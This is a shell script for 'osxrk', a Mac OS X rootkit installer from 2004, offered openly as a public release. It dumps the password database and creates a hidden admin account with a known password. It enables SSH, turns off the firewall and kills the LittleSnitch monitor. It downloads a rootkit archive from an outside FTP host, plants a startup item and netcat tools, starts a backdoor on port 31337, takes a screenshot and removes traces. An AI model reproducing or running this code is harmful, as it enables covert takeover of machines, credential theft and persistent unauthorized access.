#!/bin/sh

###################################
# osxrk : OS X - Rookit #
# the burning man - Public Release 0.2.1
#      Sept. 2004#      
#                              by g@pple#
# greets and thanks to DimBulb, Dr. Springfield, Jawn Doh!, B-r00t!,# the fbsdrk & fbsdrootkit teams for inspiration.



# Leave these alone
IVER="0.2.1"
NAM=`sw_vers -productName`
VER=`sw_vers -productVersion`
BLD=`sw_vers -buildVersion`
OSXRKDIR="/dev/.rk"
USRDIR="/tmp/.work"


echo "######################################################################"
echo "#                                                                    #"
echo "#                      -->   osxrk   <--                             #"
echo "#                                                                    #"
echo "#                        OS X - Rookit                               #"
echo "#                                                                    #"
echo "#       the burning man ...                                          #"
echo "#                      Public Release $IVER                          #"
echo "#                      --------------------                          #"
echo "#                                                                    #"
echo "#                                starting installation...........    #"
echo "######################################################################"
echo "*                                                                    *"
echo "********************** Welcome to '`hostname -s`' ********************"
echo ""
echo "checking system info:"
echo "----------------------------------------------------------------------"
/usr/bin/sw_vers
echo ""
/usr/bin/uptime
echo "----------------------------------------------------------------------"
/usr/bin/uname -a
echo ""
/usr/bin/w
sleep 4
echo ""
echo "----------------------------------------------------------------------"
echo "nidump the password file"
echo "----------------------------------------------------------------------"
#lets grab this now in case anything goes wrong
/usr/bin/nidump passwd .
echo ""
/usr/bin/nidump passwd /
echo "----------------------------------------------------------------------"
echo "checking out: /Users & /private"
echo "----------------------------------------------------------------------"
#check users and private for info
/bin/ls -al /Users
/bin/ls -al /private
echo "----------------------------------------------------------------------"
echo "checking out prefpanes & startupitems"
echo "----------------------------------------------------------------------"
# check for opener to see if box is 0wn3d!!!
	if test -e /Library/StartupItems/opener/opener; then
			echo "";
			echo "*** WARNING: Opener already installed?! Opener Found!";
			echo "We will Replace it with Ours!";
	fi;
# check for LittleSnitch
	if test -e /Library/StartupItems/LittleSnitch/LittleSnitch; then
			echo "";
			echo "*** WARNING: LittleSnitch Found!";
			echo "Install should still go fine :)";
	fi
# list some info to see how advanced a system we are dealing with  
echo ""
/bin/ls -al /Library/PreferencePanes/
/bin/ls -al /Library/StartupItems/
echo "----------------------------------------------------------------------"
echo "checking for remote logging... "
echo ""
# check for remote logging snagged from tornkit
# 127.0.0.1 logging is normal for osx 10.3.x
SYSLOGCONF="/etc/syslog.conf"

REMOTE=`grep -v "^#" "$SYSLOGCONF" | grep -v "^$" | grep "@" | cut -d '@' -f 2`

if [ ! -z "$REMOTE" ]; then
        echo "holy guacamole batman"
        echo
        echo '                      REMOTE LOGGING DETECTED '
        echo '        I hope you can get to these other computer(s): '
        echo
        for host in $REMOTE; do
                echo -n "            "
                echo $host
        done
        echo
        echo '       cuz this computer is LOGGING to it... '
        echo
else
        echo "guess not."
fi

# lets create some directorys and do some checks
if test -d $USRDIR; then
	echo "FATAL: osxrk already installed?! $USRDIR Found!";
#	exit 1;
fi;
/bin/mkdir $USRDIR
/bin/chmod 777 $USRDIR
if test -d $OSXRKDIR; then
	echo "FATAL: osxrk already installed?! $OSXRKDIR Found!";
#	exit 1;
fi;
/bin/mkdir $OSXRKDIR
/bin/chmod 777 $OSXRKDIR
cd $USRDIR

echo "----------------------------------------------------------------------"
echo installing new user: LDAP-daemon
niutil -create . /users/LDAP-daemon
niutil -createprop . /users/LDAP-daemon uid 401
niutil -createprop . /users/LDAP-daemon realname "LDAP-daemon"
niutil -createprop . /users/LDAP-daemon home "/dev/null"
niutil -createprop . /users/LDAP-daemon shell "/bin/bash"
niutil -createprop . /users/LDAP-daemon gid 20
niutil -createprop . /users/LDAP-daemon passwd "rQ3p5/hpOpvGE" # (it's 1234)
nicl . -append /groups/admin users LDAP-daemon
kill -HUP `(ps axe | grep netinfod | grep -v grep | cut -d' ' -f3)`

echo "----------------------------------------------------------------------"
echo "making sure ssh is enabled"
sshstate=""
sshstate=`cat /etc/hostconfig | grep "SSHSERVER="`
if [ "${sshstate}" = "SSHSERVER=-NO-" ] ; then
echo "service ssh" > /private/etc/xinetd.d/ssh
echo "{" >> /private/etc/xinetd.d/ssh
echo "disable = no" >> /private/etc/xinetd.d/ssh
echo "socket_type = stream" >> /private/etc/xinetd.d/ssh
echo "wait = no" >> /private/etc/xinetd.d/ssh
echo "user = root" >> /private/etc/xinetd.d/ssh
echo "server = /usr/libexec/sshd-keygen-wrapper" >> /private/etc/xinetd.d/ssh
echo "server_args = -i" >> /private/etc/xinetd.d/ssh
echo "groups = yes" >> /private/etc/xinetd.d/ssh
echo "flags = REUSE IPv6" >> /private/etc/xinetd.d/ssh
echo "session_create = yes" >> /private/etc/xinetd.d/ssh
echo "}" >> /private/etc/xinetd.d/ssh
echo "SSHSERVER=-YES-" >> /etc/hostconfig
fi

echo "----------------------------------------------------------------------"
echo "turning firewall OFF"
defaults write /Library/Preferences/com.apple.sharing.firewall state no

echo "----------------------------------------------------------------------"
echo "killing LS to download tools..."
/usr/bin/killall -m LittleSnitch

echo "----------------------------------------------------------------------"
echo "downloading tools to: $USRDIR"
/usr/bin/ftp ftp://www.foobar.com/mysite/rootkit.tar
/usr/bin/tar -xf rootkit.tar
cd $USRDIR/rootkit/

echo "----------------------------------------------------------------------"
echo "installing tools to: $OSXRKDIR"
/bin/cp -R $USRDIR/rootkit/nc $OSXRKDIR/nc
/bin/cp -R $USRDIR/rootkit/diepu $OSXRKDIR/diepu
/bin/cp -R $USRDIR/rootkit/backd $OSXRKDIR/backd

echo "----------------------------------------------------------------------"
echo "installing modified opener 2.38 by DimBulb & JawnDoh!"
/bin/mkdir /Library/StartupItems
/bin/mkdir /Library/StartupItems/opener
/bin/chmod 777 /Library/StartupItems
/bin/chmod 777 /Library/StartupItems/opener
/bin/rm -rf $USRDIR/temp/opener/.DS_Store
/bin/cp -R $USRDIR/temp/opener/ /Library/StartupItems/opener/
/bin/chmod 777 /Library/StartupItems/opener/

echo "----------------------------------------------------------------------"
echo "starting tcp backdoor on port: 31337"
echo ""
cd $OSXRKDIR
./backd

echo "----------------------------------------------------------------------"
echo "grabbing a screesnhot"
/usr/sbin/screencapture -x $OSXRKDIR/cap.pdf

echo "----------------------------------------------------------------------"
echo "cleaning up temp files - one picture is worth a thousand words"
cd $OSXRKDIR
/bin/rm -rf $USRDIR
cd /
echo "----------------------------------------------------------------------"
echo "done osx rootkit install - another apple successfully 0wn3d!"
echo ""
echo "r0ck on!"
echo "----------------------------------------------------------------------"
echo ""

